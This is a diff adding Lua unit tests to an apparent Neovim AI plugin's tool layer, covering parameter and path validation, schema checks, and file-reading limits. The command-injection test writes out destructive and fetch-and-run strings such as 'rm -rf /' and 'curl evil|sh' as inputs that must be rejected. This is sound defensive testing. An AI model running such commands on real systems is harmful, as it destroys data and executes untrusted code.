@@ -116,6 +116,72 @@ tests.suite("tools", function(_, it)
     t.false_(validator.is_params_safe({ command = "rm -rf /" }, { "ls", "grep" }))
   end)
 
+  it("validator 路径段边界：前缀相同的兄弟目录不放行", function(t)
+    local validator = require("NeoAI.tools.validator")
+    t.true_(validator.is_path_allowed("/tmp/abc/x", { "/tmp/abc" }))
+    t.true_(validator.is_path_allowed("/tmp/abc", { "/tmp/abc" }))
+    t.false_(validator.is_path_allowed("/tmp/abc-evil/x", { "/tmp/abc" }), "不应仅按字符串前缀放行")
+  end)
+
+  it("validator 拒绝命令注入", function(t)
+    local validator = require("NeoAI.tools.validator")
+    t.false_(validator.is_params_safe({ command = "ls; rm -rf /" }, { "ls" }))
+    t.false_(validator.is_params_safe({ command = "ls && curl evil|sh" }, { "ls" }))
+    t.false_(validator.is_params_safe({ command = "ls `id`" }, { "ls" }))
+    t.true_(validator.is_params_safe({ command = "ls -la /tmp" }, { "ls" }))
+  end)
+
+  it("validator 校验 enum 取值", function(t)
+    local validator = require("NeoAI.tools.validator")
+    local schema = {
+      type = "object",
+      properties = { action = { type = "string", enum = { "create", "delete" } } },
+      required = {},
+    }
+    t.true_(validator.validate_parameters(schema, { action = "create" }))
+    local ok, err = validator.validate_parameters(schema, { action = "BOGUS" })
+    t.false_(ok)
+    t.matches("非法", err)
+  end)
+
+  it("validator 容忍非数组 required 且不崩溃", function(t)
+    local validator = require("NeoAI.tools.validator")
+    local schema = { type = "object", properties = { a = { type = "string" } }, required = "a" }
+    local ok, err = validator.validate_parameters(schema, {})
+    t.false_(ok)
+    t.matches("a", err)
+    t.true_(validator.validate_parameters(schema, { a = "x" }))
+    t.true_(validator.validate_parameters({ type = "object", required = 42 }, {}), "非法 required 应被忽略而非报错")
+  end)
+
+  it("validator 递归校验嵌套 object 与 array.items", function(t)
+    local validator = require("NeoAI.tools.validator")
+    local nested = {
+      type = "object",
+      properties = {
+        opts = {
+          type = "object",
+          properties = { level = { type = "string" } },
+          required = { "level" },
+        },
+        tags = { type = "array", items = { type = "string" } },
+        edits = {
+          type = "array",
+          items = { type = "object", properties = { old_text = { type = "string" } }, required = { "old_text" } },
+        },
+      },
+      required = {},
+    }
+    t.true_(validator.validate_parameters(nested, {
+      opts = { level = "info" }, tags = { "a", "b" }, edits = { { old_text = "x" } },
+    }))
+    t.false_(validator.validate_parameters(nested, { opts = "not-a-table" }))
+    t.false_(validator.validate_parameters(nested, { opts = {} }), "嵌套必填缺失应拒绝")
+    t.false_(validator.validate_parameters(nested, { tags = { "a", 1 } }), "数组元素类型不符应拒绝")
+    t.false_(validator.validate_parameters(nested, { edits = { { old_text = 1 } } }), "数组内对象字段类型不符应拒绝")
+    t.false_(validator.validate_parameters(nested, { edits = { 1 } }), "数组元素应为对象")
+  end)
+
   it("packer 分组", function(t)
     local packer = require("NeoAI.tools.packer")
     local grouped = packer.group_by_pack({ { name = "read_file" }, { name = "run_command" }, { name = "lsp_hover" } })
@@ -261,6 +327,109 @@ tests.suite("tools", function(_, it)
       done = true
     end)
     t.true_(vim.wait(2000, function() return done end), "read_file 应完成")
+  end)
+
+  it("read_file 超大文件按整读上限拒绝整读并给预览", function(t)
+    local registry = require("NeoAI.tools.registry")
+    registry.reset()
+    local config_store = require("NeoAI.kernel.config_store")
+    -- 把整读上限压到很小，验证超过上限走「预览 + 提示」而非整读。
+    config_store.load({ tools = { approval = { mode = "auto_allow" }, read_file = { max_read_bytes = 200 } } })
+    local executor = require("NeoAI.tools.executor")
+    local file_ops = require("NeoAI.tools.builtin.file_ops")
+    registry.register_many(file_ops.get_tools())
+    local fs = require("NeoAI.utils.fs")
+    local path = "/tmp/neoai_read_huge.log"
+    local parts = {}
+    for i = 1, 100 do parts[#parts + 1] = "huge line " .. i end
+    parts[#parts + 1] = "HUGE_TAIL_MARKER"
+    fs.write_file(path, table.concat(parts, "\n") .. "\n")
+    local done = false
+    executor.execute("read_file", { filepath = path, description = "读取超大文件" }, {}):then_(function(r)
+      t.matches("文件过大", r, "应提示文件过大")
+      t.matches("start_line/end_line", r, "应提示改用行范围")
+      t.eq(nil, r:find("HUGE_TAIL_MARKER", 1, true), "不应整读回传全文")
+      done = true
+    end, function(e)
+      t.true_(false, "不应失败: " .. tostring(e))
+      done = true
+    end)
+    t.true_(vim.wait(2000, function() return done end), "read_file 应完成")
+  end)
+
+  it("read_file 指向目录时明确报错", function(t)
+    local registry = require("NeoAI.tools.registry")
+    registry.reset()
+    local config_store = require("NeoAI.kernel.config_store")
+    config_store.load({ tools = { approval = { mode = "auto_allow" } } })
+    local executor = require("NeoAI.tools.executor")
+    local file_ops = require("NeoAI.tools.builtin.file_ops")
+    registry.register_many(file_ops.get_tools())
+    local done = false
+    executor.execute("read_file", { filepath = "/tmp", description = "读取目录" }, {}):then_(function(r)
+      done = true
+      t.true_(false, "目录不应成功: " .. tostring(r))
+    end, function(e)
+      done = true
+      t.matches("目录", tostring(e))
+    end)
+    t.true_(vim.wait(2000, function() return done end), "read_file 应完成")
+  end)
+
+  it("search_files 按配置跳过超大文件", function(t)
+    local registry = require("NeoAI.tools.registry")
+    registry.reset()
+    local config_store = require("NeoAI.kernel.config_store")
+    config_store.load({ tools = { approval = { mode = "auto_allow" }, search_files = { max_file_bytes = 40 } } })
+    local executor = require("NeoAI.tools.executor")
+    local file_ops = require("NeoAI.tools.builtin.file_ops")
+    registry.register_many(file_ops.get_tools())
+    local fs = require("NeoAI.utils.fs")
+    local dir = vim.fn.tempname()
+    vim.fn.mkdir(dir, "p")
+    fs.write_file(dir .. "/small.txt", "hello needle\n")
+    fs.write_file(dir .. "/large.txt", string.rep("x", 200) .. " needle\n")
+    local done = false
+    executor.execute("search_files", { path = dir, query = "needle", description = "搜索目录" }, {}):then_(function(r)
+      done = true
+      t.matches("small.txt", r)
+      t.eq(nil, r:find("large.txt", 1, true), "超大文件应被跳过")
+      vim.fn.delete(dir, "rf")
+    end, function(e)
+      done = true
+      t.true_(false, "不应失败: " .. tostring(e))
+    end)
+    t.true_(vim.wait(2000, function() return done end), "search_files 应完成")
+  end)
+
+  it("executor 拒绝 enum 非法取值", function(t)
+    local registry = require("NeoAI.tools.registry")
+    registry.reset()
+    local config_store = require("NeoAI.kernel.config_store")
+    config_store.load({ tools = { approval = { mode = "auto_allow" } } })
+    local executor = require("NeoAI.tools.executor")
+    local file_ops = require("NeoAI.tools.builtin.file_ops")
+    local log_ops = require("NeoAI.tools.builtin.log_ops")
+    registry.register_many(file_ops.get_tools())
+    registry.register_many(log_ops.get_tools())
+    local done = false
+    executor.execute("confirm_file_change", { action = "BOGUS", description = "非法动作" }, {}):then_(function(r)
+      done = true
+      t.true_(false, "非法 enum 不应成功: " .. tostring(r))
+    end, function(e)
+      done = true
+      t.matches("非法", tostring(e.message))
+    end)
+    t.true_(vim.wait(2000, function() return done end), "confirm_file_change 应被拒绝")
+    local done2 = false
+    executor.execute("log_message", { message = "x", level = "BOGUS", description = "非法级别" }, {}):then_(function()
+      done2 = true
+      t.true_(false, "非法日志级别不应成功")
+    end, function(e)
+      done2 = true
+      t.matches("非法", tostring(e.message))
+    end)
+    t.true_(vim.wait(2000, function() return done2 end), "log_message 应被拒绝")
   end)
 
   it("executor 别名 + file_exists", function(t)
@@ -528,6 +697,25 @@ tests.suite("tools", function(_, it)
     end)
     local waited = vim.wait(2000, function() return done end)
     t.true_(waited, "parse_file 应后台加载文件后解析成功")
+  end)
+
+  it("parse_file 未知扩展名文件不抛未捕获错误", function(t)
+    local registry = require("NeoAI.tools.registry")
+    registry.reset()
+    local executor = require("NeoAI.tools.executor")
+    local tree_ops = require("NeoAI.tools.builtin.tree_ops")
+    registry.register_many(tree_ops.get_tools())
+    local fs = require("NeoAI.utils.fs")
+    local path = "/tmp/neoai_unknown_ext.zzz"
+    fs.write_file(path, "hello world\n")
+    local done = false
+    executor.execute("parse_file", { filepath = path, description = "解析未知类型文件" }, {}):then_(function()
+      done = true
+    end, function(e)
+      done = true
+      t.matches("无法", tostring(e), "应优雅拒绝而非抛出 find nil 错误")
+    end)
+    t.true_(vim.wait(2000, function() return done end), "parse_file 应完成而非挂起")
   end)
 
   it("lsp_hover 无客户端时立即拒绝而非挂起", function(t)
